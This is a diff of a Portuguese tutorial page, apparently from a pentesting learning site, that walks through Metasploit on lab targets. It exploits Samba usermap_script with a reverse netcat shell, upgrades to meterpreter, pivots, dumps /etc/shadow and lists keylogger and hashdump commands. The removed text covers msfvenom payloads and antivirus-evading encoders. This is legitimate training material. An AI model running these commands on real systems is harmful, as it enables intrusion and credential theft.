@@ -1,254 +1,470 @@
 import { PageContainer } from "@/components/layout/PageContainer";
 import { AlertBox } from "@/components/ui/AlertBox";
 import { CodeBlock } from "@/components/ui/CodeBlock";
-import { ParamsTable } from "@/components/ui/ParamsTable";
+import { CommandTable } from "@/components/ui/CommandTable";
+import { OutputBlock } from "@/components/ui/OutputBlock";
+import { PracticeBox } from "@/components/ui/PracticeBox";
+import { Terminal } from "@/components/ui/Terminal";
 
 export default function Metasploit() {
   return (
     <PageContainer
-      title="Metasploit Framework"
-      subtitle="A plataforma de exploração mais poderosa do mundo para testes de penetração."
-      difficulty="avancado"
-      timeToRead="15 min"
+      title="Metasploit Framework — Exploração"
+      subtitle="msfconsole, módulos exploit/auxiliary/post, payloads, sessions, meterpreter, db_*."
+      difficulty="intermediário"
+      timeToRead="25 min"
+      prompt="exploit/metasploit"
     >
-      <AlertBox type="danger" title="Uso exclusivo em sistemas autorizados">
-        Explorar sistemas sem autorização é crime federal em muitos países, incluindo o Brasil (Lei 12.737/2012). 
-        Use apenas em laboratórios, CTFs e sistemas com autorização explícita.
-      </AlertBox>
+      <h2>Setup</h2>
+      <Terminal
+        path="~"
+        lines={[
+          {
+            cmd: "sudo systemctl enable --now postgresql",
+            out: "(necessário para o banco do msf)",
+            outType: "muted",
+          },
+          {
+            cmd: "sudo msfdb init",
+            out: `[+] Starting database
+[+] Creating database user 'msf'
+[+] Creating databases 'msf' and 'msf_test'
+[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'`,
+            outType: "success",
+          },
+          {
+            cmd: "msfconsole -q",
+            out: `msf6 > db_status
+[*] Connected to msf. Connection type: postgresql.
 
-      <h2>Iniciando o Metasploit</h2>
-      <CodeBlock language="bash" code={`# Inicializar o banco de dados (primeiro uso)
-sudo msfdb init
+msf6 > version
+Framework: 6.4.42-dev
+Console  : 6.4.42-dev`,
+            outType: "info",
+          },
+        ]}
+      />
 
-# Iniciar o console interativo
-sudo msfconsole
+      <h2>Workspaces e DB</h2>
+      <Terminal
+        user="msf6"
+        host=""
+        path=""
+        prompt=">"
+        lines={[
+          {
+            cmd: "workspace -a htb_lame",
+            out: "[*] Added workspace: htb_lame",
+            outType: "muted",
+          },
+          {
+            cmd: "workspace",
+            out: `* htb_lame
+  default`,
+            outType: "default",
+          },
+          {
+            comment: "importar saída de nmap (.xml) — popula hosts/services automaticamente",
+            cmd: "db_import scan.xml",
+            out: `[*] Importing 'Nmap XML' data
+[*] Import: Parsing with 'Nokogiri v1.16.7'
+[*] Importing host 10.10.10.5
+[*] Successfully imported /home/wallyson/scan.xml`,
+            outType: "info",
+          },
+          {
+            cmd: "hosts",
+            out: `Hosts
+=====
+address     mac                name           os_name        os_flavor   os_sp  purpose  info  comments
+-------     ---                ----           -------        ---------   -----  -------  ----  --------
+10.10.10.5  XX:XX:XX:XX:XX:XX  lame.htb       Linux          Ubuntu      8.04   server`,
+            outType: "default",
+          },
+          {
+            cmd: "services -p 22,445",
+            out: `Services
+========
+host         port  proto  name         state  info
+----         ----  -----  ----         -----  ----
+10.10.10.5   22    tcp    ssh          open   OpenSSH 4.7p1 Debian 8ubuntu1
+10.10.10.5   445   tcp    smb          open   Samba 3.0.20-Debian (workgroup: WORKGROUP)`,
+            outType: "info",
+          },
+        ]}
+      />
 
-# Iniciar silencioso (sem banner)
-sudo msfconsole -q
+      <h2>Buscar e usar módulos</h2>
+      <Terminal
+        user="msf6"
+        host=""
+        path=""
+        prompt=">"
+        lines={[
+          {
+            cmd: "search type:exploit name:samba",
+            out: `Matching Modules
+================
 
-# Executar um comando e sair
-sudo msfconsole -q -x "use exploit/multi/handler; show options"
+   #   Name                                                Disclosure  Rank       Check  Description
+   -   ----                                                ----------  ----       -----  -----------
+   0   exploit/multi/samba/usermap_script                  2007-05-14  excellent  No     Samba "username map script" Command Execution
+   1   exploit/linux/samba/setinfopolicy_heap              2012-04-10  normal     No     Samba SetInformationPolicy AuditEventsInfo Heap Overflow
+   2   exploit/linux/samba/is_known_pipename               2017-03-24  excellent  Yes    Samba is_known_pipename() Arbitrary Module Load
+[...]`,
+            outType: "info",
+          },
+          {
+            cmd: "use 0",
+            out: "[*] Using exploit/multi/samba/usermap_script\nmsf6 exploit(multi/samba/usermap_script) >",
+            outType: "muted",
+          },
+          {
+            cmd: "info",
+            out: `       Name: Samba "username map script" Command Execution
+     Module: exploit/multi/samba/usermap_script
+   Platform: Unix
+       Arch: cmd
+ Privileged: Yes
+    License: Metasploit Framework License (BSD)
+       Rank: Excellent
+  Disclosed: 2007-05-14
 
-# Verificar versão
-msfconsole --version`} />
+Provided by:
+  jduck <jduck@metasploit.com>
 
-      <AlertBox type="info" title="Ajuda dentro do msfconsole">
-        Dentro do Metasploit, use <code>help</code> para ver todos os comandos disponíveis, 
-        <code>help COMANDO</code> para detalhes de um comando específico, e <code>info</code> 
-        para ver informações completas do módulo carregado — tudo em inglês mas explicado em português abaixo.
-      </AlertBox>
+Available targets:
+  Id  Name
+  --  ----
+  0   Automatic
 
-      <h2>Comandos principais do msfconsole</h2>
-      <CodeBlock language="bash" code={`# Dentro do msfconsole:
+Basic options:
+  Name    Current Setting  Required  Description
+  ----    ---------------  --------  -----------
+  RHOSTS                   yes       The target host(s)
+  RPORT   139              yes       The target port (TCP)`,
+            outType: "default",
+          },
+          {
+            cmd: "options",
+            out: `Module options (exploit/multi/samba/usermap_script):
 
-# Ajuda geral
-help
-help search
+   Name    Current Setting  Required  Description
+   ----    ---------------  --------  -----------
+   RHOSTS                   yes       The target host(s)
+   RPORT   139              yes       The target port (TCP)
 
-# Pesquisar módulos
-search type:exploit platform:windows smb
-search cve:2021-44228         # Log4Shell
-search ms17-010               # EternalBlue
-search wordpress               # exploits para WordPress
+Payload options (cmd/unix/reverse_netcat):
 
-# Selecionar módulo
-use exploit/windows/smb/ms17_010_eternalblue
-use 0   # usar pelo número do search
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address
+   LPORT  4444             yes       The listen port`,
+            outType: "default",
+          },
+        ]}
+      />
 
-# Ver informações do módulo
-info
-show description
-show options
-show advanced
-show payloads
+      <h2>Configurar e rodar</h2>
+      <Terminal
+        user="msf6"
+        host="exploit(multi/samba/usermap_script)"
+        path=""
+        prompt=">"
+        lines={[
+          {
+            cmd: "set RHOSTS 10.10.10.5",
+            out: "RHOSTS => 10.10.10.5",
+            outType: "muted",
+          },
+          {
+            cmd: "set LHOST tun0",
+            out: "LHOST => 10.10.14.42",
+            outType: "muted",
+          },
+          {
+            cmd: "set LPORT 4444",
+            out: "LPORT => 4444",
+            outType: "muted",
+          },
+          {
+            cmd: "show payloads",
+            out: `Compatible Payloads
+===================
+   #  Name                                Description
+   -  ----                                -----------
+   0  cmd/unix/bind_awk                   Listen for connection
+   1  cmd/unix/bind_netcat                Listen for connection
+   2  cmd/unix/reverse                    Reverse shell using bash
+   3  cmd/unix/reverse_awk                Reverse shell via awk
+   4  cmd/unix/reverse_netcat             Reverse shell via netcat -e
+   5  cmd/unix/reverse_perl               Reverse shell via perl`,
+            outType: "default",
+          },
+          {
+            cmd: "set payload cmd/unix/reverse_netcat",
+            out: "payload => cmd/unix/reverse_netcat",
+            outType: "muted",
+          },
+          {
+            cmd: "check",
+            out: "[*] 10.10.10.5:139 - The service is running, but could not be validated.",
+            outType: "warning",
+          },
+          {
+            cmd: "exploit",
+            out: `[*] Started reverse TCP handler on 10.10.14.42:4444 
+[*] 10.10.10.5:139 - Command shell session 1 opened (10.10.14.42:4444 -> 10.10.10.5:34567)
 
-# Configurar opções
-set RHOSTS 192.168.1.1
-set RPORT 445
-set LHOST 192.168.1.100
+id
+uid=0(root) gid=0(root)
+hostname
+lame`,
+            outType: "success",
+          },
+        ]}
+      />
+
+      <h2>Sessions e meterpreter</h2>
+      <Terminal
+        user="msf6"
+        host=""
+        path=""
+        prompt=">"
+        lines={[
+          {
+            comment: "Ctrl+Z para enviar a session ao background",
+            cmd: "background",
+            out: `[*] Backgrounding session 1...
+msf6 exploit(...) > `,
+            outType: "default",
+          },
+          {
+            cmd: "sessions",
+            out: `Active sessions
+===============
+
+  Id  Name  Type        Information                            Connection
+  --  ----  ----        -----------                            ----------
+  1         shell unix  Shell Banner: Linux lame 2.6.24-16     10.10.14.42:4444 -> 10.10.10.5:34567 (10.10.10.5)`,
+            outType: "info",
+          },
+          {
+            comment: "upgrade shell para meterpreter",
+            cmd: "sessions -u 1",
+            out: `[*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]
+[*] Upgrading session ID: 1
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.10.14.42:4445 
+[*] Sending stage (3045348 bytes) to 10.10.10.5
+[*] Meterpreter session 2 opened (10.10.14.42:4445 -> 10.10.10.5:42178)`,
+            outType: "success",
+          },
+          {
+            cmd: "sessions -i 2",
+            out: `[*] Starting interaction with 2...
+
+meterpreter > `,
+            outType: "info",
+          },
+        ]}
+      />
+
+      <CommandTable
+        title="Comandos do meterpreter"
+        variations={[
+          { cmd: "sysinfo", desc: "Info do alvo (OS, arch, hostname).", output: "Computer: lame.htb\\nOS: Linux 2.6.24-16\\nArch: x86" },
+          { cmd: "getuid", desc: "Quem você é no alvo.", output: "Server username: root" },
+          { cmd: "ps", desc: "Lista processos.", output: "Tabela com PID, name, user, path." },
+          { cmd: "migrate <PID>", desc: "Migra para outro processo (estabilidade).", output: "Útil para sair de um IE32 para um lsass." },
+          { cmd: "shell", desc: "Drop para shell nativa do alvo.", output: "/bin/bash ou cmd.exe" },
+          { cmd: "upload arquivo /tmp/", desc: "Envia arquivo do Kali → alvo.", output: "Para colocar binários (linpeas, mimikatz)." },
+          { cmd: "download /etc/shadow .", desc: "Baixa arquivo do alvo → Kali.", output: "Para análise local." },
+          { cmd: "search -f flag.txt", desc: "Procura arquivo.", output: "Recursivo no FS do alvo." },
+          { cmd: "screenshot", desc: "Print da tela (se gráfico).", output: "Salva em ~/.msf4/loot/" },
+          { cmd: "keyscan_start / dump / stop", desc: "Keylogger.", output: "Captura tudo digitado." },
+          { cmd: "hashdump", desc: "SAM hashes (Windows).", output: "user:RID:LM:NTLM:::" },
+          { cmd: "getsystem", desc: "Tenta escalar para SYSTEM (Windows).", output: "Tenta vários métodos automaticamente." },
+          { cmd: "portfwd add -l 8080 -p 80 -r 192.168.10.5", desc: "Pivoting: porta 8080 local → 80 interno.", output: "Acessar redes internas." },
+          { cmd: "route add 192.168.10.0/24 1", desc: "Roteia tráfego do msf por essa session.", output: "Para usar outros módulos pelo pivot." },
+        ]}
+      />
+
+      <h2>Módulos auxiliary (scanners)</h2>
+      <Terminal
+        user="msf6"
+        host=""
+        path=""
+        prompt=">"
+        lines={[
+          {
+            cmd: "use auxiliary/scanner/smb/smb_version",
+            out: "msf6 auxiliary(scanner/smb/smb_version) >",
+            outType: "muted",
+          },
+          {
+            cmd: "set RHOSTS 192.168.1.0/24; run",
+            out: `[+] 192.168.1.5:445       - SMB Detected (versions:1, 2, 3) (preferred dialect:SMB 3.1.1) (signatures:required) (uptime:23 days) (guid:{abc123})
+[+] 192.168.1.50:445      - SMB Detected (versions:2, 3) (preferred dialect:SMB 3.1.1) (signatures:required)
+[+] 192.168.1.108:445     - SMB Detected (versions:1) (preferred dialect:SMB 1.0) (signatures:disabled) (uptime:1 days)  ← VULN!`,
+            outType: "warning",
+          },
+          {
+            cmd: "use auxiliary/scanner/portscan/tcp",
+            out: "msf6 auxiliary(scanner/portscan/tcp) >",
+            outType: "muted",
+          },
+          {
+            cmd: "set RHOSTS 192.168.1.50; set PORTS 1-1000; run",
+            out: `[+] 192.168.1.50:           - 22 - TCP OPEN
+[+] 192.168.1.50:           - 80 - TCP OPEN
+[+] 192.168.1.50:           - 443 - TCP OPEN
+[*] Auxiliary module execution completed`,
+            outType: "info",
+          },
+        ]}
+      />
+
+      <h2>Resource files (automação)</h2>
+      <CodeBlock
+        language="bash"
+        title="auto.rc — script reproduzível"
+        code={`workspace -a auto_lab
+db_import /home/wallyson/scan.xml
+
+use exploit/multi/samba/usermap_script
+set RHOSTS 10.10.10.5
+set LHOST tun0
 set LPORT 4444
-setg LHOST 192.168.1.100      # setg = define globalmente
+set payload cmd/unix/reverse_netcat
+exploit -j -z
 
-# Executar
-run
-exploit`} />
+# rodar em background, não interagir`}
+      />
 
-      <ParamsTable
-        title="Comandos do msfconsole — explicados em português"
-        params={[
-          { flag: "search TERMO", desc: "Pesquisa módulos por nome, CVE, plataforma, tipo, etc. Retorna lista numerada.", exemplo: "search ms17-010" },
-          { flag: "use MÓDULO", desc: "Seleciona um módulo para usar. Pode usar o caminho completo ou o número do search.", exemplo: "use exploit/windows/smb/ms17_010_eternalblue" },
-          { flag: "info", desc: "Exibe informações completas do módulo selecionado: descrição, referências CVE, opções, plataformas.", exemplo: "info" },
-          { flag: "show options", desc: "Mostra as opções do módulo atual: nome, valor atual, se é obrigatório e descrição.", exemplo: "show options" },
-          { flag: "show advanced", desc: "Mostra opções avançadas do módulo — configurações menos comuns mas importantes.", exemplo: "show advanced" },
-          { flag: "show payloads", desc: "Lista todos os payloads compatíveis com o exploit selecionado.", exemplo: "show payloads" },
-          { flag: "set OPÇÃO VALOR", desc: "Define o valor de uma opção do módulo atual.", exemplo: "set RHOSTS 192.168.1.1" },
-          { flag: "setg OPÇÃO VALOR", desc: "Define globalmente (g=global) uma opção para todos os módulos. Evita redigitar LHOST/LPORT.", exemplo: "setg LHOST 10.10.14.1" },
-          { flag: "unset OPÇÃO", desc: "Limpa o valor de uma opção.", exemplo: "unset PAYLOAD" },
-          { flag: "run / exploit", desc: "Executa o módulo com as opções configuradas.", exemplo: "run" },
-          { flag: "check", desc: "Verifica se o alvo é vulnerável SEM explorar. Nem todos os módulos suportam.", exemplo: "check" },
-          { flag: "back", desc: "Volta ao menu principal sem descartar as configurações.", exemplo: "back" },
-          { flag: "sessions", desc: "Lista todas as sessões abertas (shells, meterpreter).", exemplo: "sessions" },
-          { flag: "sessions -i N", desc: "Abre (interage com) a sessão número N.", exemplo: "sessions -i 1" },
-          { flag: "sessions -k N", desc: "Mata (encerra) a sessão número N.", exemplo: "sessions -k 1" },
-          { flag: "jobs", desc: "Lista módulos rodando em background.", exemplo: "jobs" },
-          { flag: "db_nmap ARGS", desc: "Roda o Nmap e importa os resultados direto no banco do Metasploit.", exemplo: "db_nmap -sV -sC 192.168.1.1" },
-          { flag: "hosts", desc: "Lista hosts descobertos e armazenados no banco de dados.", exemplo: "hosts" },
-          { flag: "services", desc: "Lista serviços encontrados em todos os hosts.", exemplo: "services" },
-          { flag: "vulns", desc: "Lista vulnerabilidades encontradas.", exemplo: "vulns" },
+      <Terminal
+        path="~"
+        lines={[
+          {
+            cmd: "msfconsole -q -r auto.rc",
+            out: `[*] Processing auto.rc for ERB directives.
+[*] resource (auto.rc)> workspace -a auto_lab
+[*] Added workspace: auto_lab
+[*] resource (auto.rc)> db_import /home/wallyson/scan.xml
+[*] Importing 'Nmap XML' data
+[*] resource (auto.rc)> exploit -j -z
+[*] Exploit running as background job 0.
+[*] Started reverse TCP handler on 10.10.14.42:4444 
+[*] Command shell session 1 opened`,
+            outType: "success",
+          },
         ]}
       />
 
-      <h2>Opções RHOSTS, LHOST — entendendo cada uma</h2>
-      <div className="grid grid-cols-1 sm:grid-cols-2 gap-3 my-6">
-        {[
-          { opt: "RHOSTS", desc: "Remote HOSTS — IP(s) alvo do exploit. Aceita IP único, range (192.168.1.1-10), CIDR (/24) ou arquivo com file:///lista.txt" },
-          { opt: "RPORT", desc: "Remote PORT — porta do serviço alvo. Preenchida automaticamente pelo módulo mas pode ser alterada." },
-          { opt: "LHOST", desc: "Local HOST — seu IP (onde o payload vai se conectar de volta). Use sua VPN IP no HackTheBox/TryHackMe." },
-          { opt: "LPORT", desc: "Local PORT — porta onde você vai ouvir a conexão reversa do alvo. Padrão é 4444." },
-          { opt: "PAYLOAD", desc: "O código que roda no alvo após explorar. Define o tipo de acesso (shell, meterpreter, etc.)." },
-          { opt: "TARGET", desc: "Versão específica do alvo quando um exploit funciona diferente para cada versão do SO/aplicação." },
-        ].map((item, i) => (
-          <div key={i} className="bg-card border border-border rounded-lg p-3 text-sm">
-            <code className="text-primary font-mono text-xs">{item.opt}</code>
-            <p className="text-xs text-muted-foreground mt-1">{item.desc}</p>
-          </div>
-        ))}
-      </div>
-
-      <h2>Payloads — o que é executado no alvo</h2>
-      <CodeBlock language="bash" code={`# Ver payloads compatíveis com o módulo atual
-show payloads
-
-# Payloads mais usados:
-set PAYLOAD windows/x64/meterpreter/reverse_tcp   # Windows 64-bit, Meterpreter reverso
-set PAYLOAD windows/meterpreter/reverse_tcp        # Windows 32-bit, Meterpreter reverso
-set PAYLOAD linux/x86/meterpreter/reverse_tcp      # Linux 32-bit
-set PAYLOAD linux/x64/meterpreter/reverse_tcp      # Linux 64-bit
-set PAYLOAD cmd/unix/reverse_bash                  # Bash reverse shell simples
-set PAYLOAD java/meterpreter/reverse_tcp           # Java (multiplataforma)`} />
-
-      <ParamsTable
-        title="Tipos de payload — explicados em português"
-        params={[
-          { flag: "reverse_tcp", desc: "O alvo CONECTA DE VOLTA para você (seu LHOST:LPORT). O mais usado — funciona mesmo atrás de firewall.", exemplo: "windows/meterpreter/reverse_tcp" },
-          { flag: "bind_tcp", desc: "Abre uma porta no ALVO e você se conecta a ele. Bom quando você não pode receber conexão reversa.", exemplo: "windows/meterpreter/bind_tcp" },
-          { flag: "reverse_https", desc: "Conexão reversa encriptada em HTTPS. Mais difícil de detectar por IDS/antivírus.", exemplo: "windows/meterpreter/reverse_https" },
-          { flag: "meterpreter", desc: "Payload avançado que roda em memória (sem criar arquivo em disco). Funcionalidades extras: upload, download, keylogger, pivot, etc.", exemplo: "windows/x64/meterpreter/reverse_tcp" },
-          { flag: "shell", desc: "Payload simples que retorna um shell de sistema operacional (cmd.exe ou /bin/sh).", exemplo: "windows/shell/reverse_tcp" },
-          { flag: "staged (/ no nome)", desc: "O payload é enviado em duas partes: o stager primeiro conecta, depois recebe o stage. Menor, melhor bypass de AV.", exemplo: "windows/meterpreter/reverse_tcp" },
-          { flag: "stageless (sem /)", desc: "Payload completo em um único arquivo. Não precisa de conexão de segunda etapa.", exemplo: "windows/meterpreter_reverse_tcp" },
+      <h2>Pivoting básico</h2>
+      <Terminal
+        user="meterpreter"
+        host=""
+        path=""
+        prompt=">"
+        lines={[
+          {
+            comment: "ALVO está em 192.168.50.10 (rede interna). Você só vê o pivot 10.10.10.5",
+            cmd: "run autoroute -s 192.168.50.0/24",
+            out: `[!] Meterpreter scripts are deprecated. Try post/multi/manage/autoroute.
+[*] Adding a route to 192.168.50.0/255.255.255.0...
+[+] Added route to 192.168.50.0/255.255.255.0 via 10.10.10.5
+[*] Use the -p option to list all active routes`,
+            outType: "info",
+          },
+          {
+            cmd: "background",
+            out: "[*] Backgrounding session 2...",
+            outType: "muted",
+          },
+          {
+            cmd: "use auxiliary/scanner/portscan/tcp; set RHOSTS 192.168.50.10; set PORTS 22,80,445; run",
+            out: `[+] 192.168.50.10:           - 22 - TCP OPEN
+[+] 192.168.50.10:           - 445 - TCP OPEN
+(scan saiu pelo session 2 → vê a rede interna)`,
+            outType: "success",
+          },
         ]}
       />
 
-      <h2>Meterpreter — comandos essenciais</h2>
-      <CodeBlock language="bash" code={`# Dentro de uma sessão Meterpreter:
-
-# Informações do sistema
-sysinfo        # SO, hostname, arquitetura
-getuid         # usuário atual no alvo
-getpid         # processo onde o meterpreter está rodando
-
-# Navegação
-pwd            # diretório atual
-ls             # listar arquivos
-cd pasta/      # mudar diretório
-cat arquivo    # ler arquivo
-
-# Transferência de arquivos
-upload arquivo.exe C:\\Windows\\Temp\\
-download C:\\Users\\admin\\Desktop\\flag.txt .
-
-# Elevação de privilégio
-getsystem      # tenta automaticamente virar SYSTEM
-run post/multi/recon/local_exploit_suggester
-
-# Dumpar senhas
-hashdump       # hashes SAM do Windows (requer SYSTEM)
-
-# Shell do OS
-shell          # abre cmd.exe ou /bin/bash
-Ctrl+Z         # volta para o meterpreter sem fechar o shell
-
-# Colocar em background e voltar
-background
-sessions -l    # listar sessões
-sessions -i 1  # voltar para sessão 1`} />
-
-      <ParamsTable
-        title="Meterpreter — comandos em português"
-        params={[
-          { flag: "sysinfo", desc: "Exibe informações do sistema: nome do host, SO, arquitetura e domínio." },
-          { flag: "getuid", desc: "Mostra com qual usuário o Meterpreter está rodando no alvo." },
-          { flag: "getsystem", desc: "Tenta automaticamente elevar privilégios para SYSTEM (Windows) usando técnicas conhecidas." },
-          { flag: "hashdump", desc: "Extrai os hashes NTLM dos usuários do Windows (SAM). Requer SYSTEM. Útil para Pass-the-Hash ou cracking offline com Hashcat." },
-          { flag: "upload ARQUIVO DESTINO", desc: "Envia um arquivo do seu computador para o alvo.", exemplo: "upload nc.exe C:\\Temp\\" },
-          { flag: "download ARQUIVO DESTINO", desc: "Baixa um arquivo do alvo para seu computador.", exemplo: "download C:\\flag.txt ." },
-          { flag: "shell", desc: "Abre um shell de sistema operacional (cmd.exe no Windows, /bin/sh no Linux). Ctrl+Z volta para Meterpreter." },
-          { flag: "background / bg", desc: "Coloca a sessão em background sem encerrá-la. Volte com: sessions -i N" },
-          { flag: "run MÓDULO", desc: "Executa um módulo post-exploitation na sessão atual.", exemplo: "run post/windows/gather/credentials/credential_collector" },
-          { flag: "migrate PID", desc: "Move o Meterpreter para outro processo. Útil para estabilidade e evasão de AV.", exemplo: "migrate 1234" },
-          { flag: "keyscan_start", desc: "Inicia um keylogger em memória. Use keyscan_dump para ver o capturado, keyscan_stop para parar." },
-          { flag: "portfwd add", desc: "Redireciona uma porta local sua para uma porta na rede interna do alvo (pivoting).", exemplo: "portfwd add -l 8080 -p 80 -r 10.0.0.5" },
-          { flag: "screenshot", desc: "Captura uma screenshot da tela do alvo (Windows com sessão de usuário ativa)." },
+      <h2>Loot e logs</h2>
+      <Terminal
+        user="msf6"
+        host=""
+        path=""
+        prompt=">"
+        lines={[
+          {
+            cmd: "loot",
+            out: `Loot
+====
+host         service  type           name           content      info        path
+----         -------  ----           ----           -------      ----        ----
+10.10.10.5            unix.passwd    passwd_data    text/plain   Linux       /home/wallyson/.msf4/loot/20260403131221_default_10.10.10.5_unix.passwd_982341.txt
+10.10.10.5            unix.shadow    shadow_data    text/plain   Linux hashes /home/wallyson/.msf4/loot/20260403131223_default_10.10.10.5_unix.shadow_141232.txt`,
+            outType: "info",
+          },
+          {
+            cmd: "creds",
+            out: `Credentials
+===========
+host         origin       service     public  private    realm  private_type  JtR Format
+----         ------       -------     ------  -------    -----  ------------  ----------
+10.10.10.5   10.10.10.5   445/tcp     admin   admin      ACME   Password      
+10.10.10.5   10.10.10.5   445/tcp     root    $1$ABC...         NTLM hash     md5crypt`,
+            outType: "warning",
+          },
         ]}
       />
 
-      <h2>Exploit multi/handler — recebendo shells</h2>
-      <CodeBlock language="bash" code={`# Listener para receber conexões de payloads gerados com msfvenom
-use exploit/multi/handler
-set PAYLOAD windows/x64/meterpreter/reverse_tcp
-set LHOST 192.168.1.100
-set LPORT 4444
-set ExitOnSession false    # não para ao receber primeira conexão
-run -j                      # -j = roda em background (job)`} />
-
-      <ParamsTable
-        title="Opções do multi/handler — explicadas"
-        params={[
-          { flag: "ExitOnSession false", desc: "Mantém o listener ativo mesmo após receber a primeira conexão. Essencial quando espera múltiplas sessões.", exemplo: "set ExitOnSession false" },
-          { flag: "run -j", desc: "Executa o handler em background como um job. Libera o console para outros comandos. Veja com: jobs", exemplo: "run -j" },
-          { flag: "AutoRunScript SCRIPT", desc: "Executa automaticamente um script Meterpreter assim que receber uma sessão.", exemplo: "set AutoRunScript post/multi/manage/shell_to_meterpreter" },
-          { flag: "ReverseAllowProxy true", desc: "Permite receber conexões mesmo que o alvo use proxy intermediário.", exemplo: "set ReverseAllowProxy true" },
+      <PracticeBox
+        title="Pwn no Metasploitable 2"
+        goal="Sequência completa: scan → import → exploit Samba → meterpreter → loot."
+        steps={[
+          "Suba Metasploitable 2 em VM (host-only).",
+          "Faça nmap full + xml e importe no msfconsole.",
+          "Use exploit/multi/samba/usermap_script.",
+          "Upgrade para meterpreter.",
+          "Dump /etc/shadow para loot.",
         ]}
+        command={`# 1) scan
+sudo nmap -sS -sV -A -p- 192.168.56.101 -oX msf2.xml
+
+# 2) msf
+msfconsole -q -x "
+workspace -a msf2;
+db_import msf2.xml;
+use exploit/multi/samba/usermap_script;
+set RHOSTS 192.168.56.101;
+set LHOST tun0;
+set payload cmd/unix/reverse_netcat;
+exploit -z"
+
+# já com session aberta, no msf:
+sessions -u 1
+sessions -i 2
+download /etc/shadow .`}
+        expected={`[*] Started reverse TCP handler on 10.10.14.42:4444
+[*] Command shell session 1 opened
+[+] Meterpreter session 2 opened
+meterpreter > getuid
+Server username: root
+meterpreter > download /etc/shadow .
+[*] Downloading: /etc/shadow → ./shadow
+[*] Downloaded 1245 bytes`}
+        verify="O arquivo ./shadow local deve ter hashes começando em $1$ ou $6$. Use john/hashcat para crackear (ver páginas dedicadas)."
       />
 
-      <h2>Gerando payloads com msfvenom</h2>
-      <CodeBlock language="bash" code={`# Listar todos os payloads
-msfvenom --list payloads
-
-# Listar formatos de saída
-msfvenom --list formats
-
-# EXE Windows 64-bit Meterpreter reverso
-msfvenom -p windows/x64/meterpreter/reverse_tcp \
-  LHOST=192.168.1.100 LPORT=4444 \
-  -f exe -o payload.exe
-
-# PHP webshell Meterpreter
-msfvenom -p php/meterpreter/reverse_tcp \
-  LHOST=192.168.1.100 LPORT=4444 \
-  -f raw -o shell.php
-
-# ELF Linux reverso
-msfvenom -p linux/x64/meterpreter/reverse_tcp \
-  LHOST=192.168.1.100 LPORT=4444 \
-  -f elf -o payload.elf && chmod +x payload.elf`} />
-
-      <ParamsTable
-        title="msfvenom — flags principais em português"
-        params={[
-          { flag: "-p PAYLOAD", desc: "Payload a gerar. Use --list payloads para ver todos os disponíveis.", exemplo: "-p windows/x64/meterpreter/reverse_tcp" },
-          { flag: "LHOST / LPORT", desc: "Opções do payload passadas diretamente: IP e porta onde você vai receber a conexão." },
-          { flag: "-f FORMATO", desc: "Formato do arquivo de saída: exe, elf, raw, php, py, js_le, dll, asp, war, jar, etc.", exemplo: "-f exe" },
-          { flag: "-o ARQUIVO", desc: "Nome do arquivo de saída.", exemplo: "-o payload.exe" },
-          { flag: "-e ENCODER", desc: "Codificador para obfuscar o payload e tentar bypassar AV.", exemplo: "-e x86/shikata_ga_nai" },
-          { flag: "-i ITERAÇÕES", desc: "Número de vezes que o encoder é aplicado. Mais iterações = mais ofuscação.", exemplo: "-i 5" },
-          { flag: "-b '\\x00'", desc: "Bad bytes a evitar no payload (caracteres que o exploit não pode conter).", exemplo: "-b '\\x00\\x0a\\x0d'" },
-          { flag: "--list payloads", desc: "Lista todos os payloads disponíveis no Metasploit.", exemplo: "msfvenom --list payloads | grep windows" },
-          { flag: "--list formats", desc: "Lista todos os formatos de arquivo de saída suportados.", exemplo: "msfvenom --list formats" },
-        ]}
-      />
+      <AlertBox type="danger" title="Use só em alvo autorizado">
+        Cada exploit do msf é uma intrusão. Use apenas em VMs próprias, plataformas (HTB/THM)
+        ou alvos com autorização escrita. Em produção, qualquer rodada de exploit sem
+        contrato é crime.
+      </AlertBox>
     </PageContainer>
   );
 }
